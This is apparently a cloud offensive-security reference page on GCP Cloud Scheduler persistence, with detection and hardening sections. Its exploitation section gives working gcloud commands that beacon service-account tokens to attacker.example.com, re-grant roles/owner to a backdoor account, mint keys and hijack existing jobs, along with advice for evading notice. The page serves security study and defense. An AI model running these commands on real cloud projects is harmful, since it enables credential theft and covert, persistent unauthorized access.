---
cstg_id: CSTG-GCP-CLOUD-SCHEDULER-PERSIST
title: "GCP Cloud Scheduler - Persistence"
provider: gcp
service: cloud-scheduler
phase: persistence
required_access: assumed-breach
required_permissions:
  - cloudscheduler.jobs.create
  - cloudscheduler.jobs.update
  - cloudscheduler.jobs.enable
  - iam.serviceAccounts.actAs
references:
  - https://cloud.google.com/scheduler/docs/creating
  - https://cloud.google.com/scheduler/docs/configuring/cron-job-schedules
  - https://cloud.google.com/scheduler/docs/http-target-auth
  - https://cloud.google.com/scheduler/docs/reference/rest/v1/projects.locations.jobs
  - https://hackingthe.cloud/gcp/
license: CC BY-SA 4.0
---

## Summary

Cloud Scheduler is an effective persistence mechanism because it provides time-based, self-firing execution that survives loss of the original foothold. A scheduler job runs as its attached service account on a recurring cron schedule with no further interaction. An adversary who can create or modify a job can therefore plant a recurring callback, a credential-minting loop, or an IAM-re-granting routine that re-establishes access long after the initial credentials are revoked, sessions expire, or a compromised instance is rebuilt.

Unlike compute-based backdoors, a scheduler job has a small footprint, blends in with legitimate automation, and does not require a running host. Because jobs persist their attached service account binding and any embedded headers/bodies, they also act as a durable store for credentials and a re-entry trigger. This page documents the persistence variants and their detection and removal.

## Prerequisites

- Assumed-breach foothold with credentials that hold scheduler write access.
- `cloudscheduler.jobs.create` (new backdoor job) or `cloudscheduler.jobs.update` (subvert an existing job).
- `iam.serviceAccounts.actAs` on whatever service account is attached, so the job can authenticate as it.
- Cloud Scheduler API enabled in the project/region.
- Optional: knowledge of an existing privileged SA to attach (see [Cloud Scheduler enumeration](../02-services/gcp-cloud-scheduler-enum.md) and [Cloud Scheduler privilege escalation](../03-privilege-escalation/gcp-cloud-scheduler-privesc.md)).

## Enumeration

Identify candidate locations, an SA to attach, and existing jobs to subvert:

```bash
gcloud scheduler locations list --project "$PROJECT"
gcloud scheduler jobs list --location "$LOC" --project "$PROJECT"
gcloud iam service-accounts list --project "$PROJECT"
```

## Exploitation

### Recurring callback / re-entry beacon (jobs.create)

Plant a job that, on each tick, calls an attacker-controlled endpoint with a freshly minted token for the attached SA. The job's OAuth/OIDC token is delivered in the outbound `Authorization` header, so the listener receives a valid credential on every fire - re-establishing access without storing a long-lived key anywhere.

```bash
gcloud scheduler jobs create http system-health-check \
  --location "$LOC" --project "$PROJECT" \
  --schedule="*/30 * * * *" \
  --uri="https://attacker.example.com/beacon" \
  --http-method=POST \
  --oauth-service-account-email="$PERSIST_SA" \
  --oauth-token-scope="https://www.googleapis.com/auth/cloud-platform"
```

Naming the job to resemble routine automation (`system-health-check`, `metrics-export`, `cert-renew`) reduces the chance it is noticed in a job list. A 30-minute or hourly cadence balances reliability against log volume.

### Self-healing IAM re-grant (jobs.create + privileged SA)

Have the job repeatedly re-assert the attacker's access so that revocation by defenders is undone on the next tick. The job calls Resource Manager `setIamPolicy` (or grants a role to an attacker-controlled SA) using a privileged attached SA.

```bash
BODY=$(jq -nc --arg m "serviceAccount:backdoor@$PROJECT.iam.gserviceaccount.com" \
  '{policy:{bindings:[{role:"roles/owner",members:[$m]}]}}')

gcloud scheduler jobs create http iam-reconcile \
  --location "$LOC" --project "$PROJECT" \
  --schedule="*/15 * * * *" \
  --uri="https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:setIamPolicy" \
  --http-method=POST \
  --headers="Content-Type=application/json" \
  --message-body="$BODY" \
  --oauth-service-account-email="$PRIV_SA"
```

Even if defenders remove the attacker's binding, the job restores it within the schedule interval. A correct implementation reads the live policy and merges to avoid clobbering other bindings (which would draw attention and could break the project).

### Recurring key / token minting

A job that periodically creates a new service-account key (or short-lived token) and ships it to an attacker-controlled endpoint provides rotating credentials that survive revocation of any single key. The attached SA must hold `iam.serviceAccounts.keys.create` (or token-creation rights) on the target SA.

```bash
gcloud scheduler jobs create http key-rotation \
  --location "$LOC" --project "$PROJECT" \
  --schedule="0 */6 * * *" \
  --uri="https://iam.googleapis.com/v1/projects/-/serviceAccounts/$TARGET_SA/keys" \
  --http-method=POST \
  --oauth-service-account-email="$PRIV_SA"
```

Because the created key material is returned in the API response to the Cloud Scheduler invocation rather than to the attacker, this variant is typically paired with a target SA whose key-creation triggers a downstream side effect, or replaced by the OAuth-token beacon above when direct credential delivery is required.

### Subverting an existing legitimate job (jobs.update)

Rather than creating a new job (which appears as a fresh `CreateJob` event), hijack a benign existing job by adding a second behaviour or repointing it. Editing preserves the original name and most of the definition, so the change is harder to spot than a brand-new job. Restore the original definition after each fire to minimise the window of visible tampering, or leave the malicious target in place if the original job already pointed at an attacker-influenceable destination.

```bash
gcloud scheduler jobs update http existing-report-job \
  --location "$LOC" --project "$PROJECT" \
  --uri="https://attacker.example.com/beacon" \
  --oauth-service-account-email="$PERSIST_SA"
```

### Re-enabling paused/disabled jobs

A `PAUSED` or `DISABLED` job still retains its SA binding, headers, and body. Re-enabling such a job (`cloudscheduler.jobs.enable`) silently reactivates whatever it was configured to do, which can be abused if a previously planted or dormant job exists.

```bash
gcloud scheduler jobs resume "$JOB_NAME" --location "$LOC" --project "$PROJECT"
```

### Region spraying for hidden placement

Jobs are regional and most operators only inspect the region where their own automation lives. Placing the backdoor job in an unused region (for example one with no other jobs) reduces the chance it is found during routine review. Defenders should enumerate every location, not just the primary one.

## Misconfigurations & Findings

- Jobs targeting external or unexpected hostnames, especially with an attached privileged SA.
- Jobs that call IAM/Resource Manager admin endpoints (`setIamPolicy`, `serviceAccounts/.../keys`) on a recurring schedule.
- Jobs whose names mimic legitimate automation but were created recently or by an unexpected principal.
- Existing jobs whose `uri`, SA, headers, or body were modified outside a known change window.
- Backdoor jobs planted in regions that host no other resources.
- Long-lived credentials embedded in job headers/bodies.

## Detection & Logging

Persistence creation and modification are Admin Activity Cloud Audit Logs (always enabled); each scheduled fire produces additional logs on the target service.

- `google.cloud.scheduler.v1.CloudScheduler.CreateJob`
- `google.cloud.scheduler.v1.CloudScheduler.UpdateJob`
- `google.cloud.scheduler.v1.CloudScheduler.ResumeJob`
- `google.cloud.scheduler.v1.CloudScheduler.DeleteJob`

```
protoPayload.serviceName="cloudscheduler.googleapis.com"
protoPayload.methodName=("google.cloud.scheduler.v1.CloudScheduler.CreateJob" OR
  "google.cloud.scheduler.v1.CloudScheduler.UpdateJob" OR
  "google.cloud.scheduler.v1.CloudScheduler.ResumeJob")
```

Detection guidance:

- Alert on `CreateJob`/`UpdateJob` where the attached `oauthToken`/`oidcToken` service account is privileged or differs from the job's previous identity.
- Alert on job targets pointing at external domains or at IAM/Resource Manager admin endpoints.
- Correlate recurring `RunJob`/scheduled-fire events with subsequent `SetIamPolicy` or `CreateServiceAccountKey` calls by the attached SA.
- Baseline the expected set of scheduler jobs per project and region via Cloud Asset Inventory; alert on drift.
- Watch for `ResumeJob` on jobs that were intentionally disabled.

## Remediation & Hardening

- Enumerate jobs across **all** regions regularly (Cloud Asset Inventory) and maintain an allowlist of expected jobs; investigate any not on it.
- Restrict `cloudscheduler.jobs.create`/`update`/`enable` to a small set of automation principals; separate from `iam.serviceAccountUser`/`actAs` on privileged SAs.
- Attach only least-privilege, single-purpose SAs to jobs; deny attachment of `roles/owner`/`roles/editor` SAs.
- Enforce Organization Policy: `iam.disableServiceAccountKeyCreation` to neutralise key-minting persistence, and `iam.allowedPolicyMemberDomains` to limit who can be granted access.
- Use VPC Service Controls / egress controls so jobs cannot beacon to arbitrary external endpoints.
- Alert on and review every job create/update/resume event; treat external-target jobs with privileged SAs as high severity.
- On suspected compromise, audit and remove unexpected jobs in all regions, rotate the attached SAs' keys, and review IAM policy for re-granted bindings.

## Tools

- `gcloud scheduler jobs create|update|resume|delete` CLI.
- Cloud Scheduler REST API (`projects.locations.jobs`).
- Cloud Asset Inventory for cross-region/org job inventory and drift detection.
- An attacker-controlled HTTPS listener for beacon/credential-delivery variants.

## References

- https://cloud.google.com/scheduler/docs/creating
- https://cloud.google.com/scheduler/docs/configuring/cron-job-schedules
- https://cloud.google.com/scheduler/docs/http-target-auth
- https://cloud.google.com/scheduler/docs/reference/rest/v1/projects.locations.jobs
- https://hackingthe.cloud/gcp/
